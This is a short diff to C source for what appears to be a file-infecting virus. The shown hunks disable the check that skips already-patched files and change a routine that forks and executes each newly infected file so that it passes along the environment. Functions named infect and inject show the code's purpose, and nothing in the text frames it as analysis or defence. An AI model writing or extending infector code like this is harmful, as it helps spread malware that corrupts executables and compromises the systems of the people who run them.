@@ -173,11 +173,13 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 		return 1;
 	}
 
-	//if (already_patched(&data) != 0) {
-	//	free_data(&data);
-	//	return 1;
-	//}
-	//
+	/* old way of checking if the file is already patched 
+	if (already_patched(&data) != 0) {
+		free_data(&data);
+		return 1;
+	}
+	*/
+
 	if (inject(&data) != 0) {
 		free_data(&data);
 		return 1;
@@ -195,7 +197,7 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 
 
 #ifdef ENABLE_EXEC
-static int execute_prog(const char *filename)
+static int execute_prog(const char *filename, char **envp)
 {
 	pid_t pid = fork();
 	if (pid == 0) {
@@ -220,7 +222,7 @@ static int execute_prog(const char *filename)
 
 		close(fd);
 
-		execve(filename, (const char *[]){filename, NULL}, NULL);
+		execve(filename, (const char *[]){filename, NULL}, envp);
 
 		exit(0);
 	} else if (pid > 0) {
@@ -276,7 +278,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 					(*counter)++;
 
 #ifdef ENABLE_EXEC
-					execute_prog(new_path);
+					execute_prog(new_path, bs_data->envp);
 #endif
 				}
 
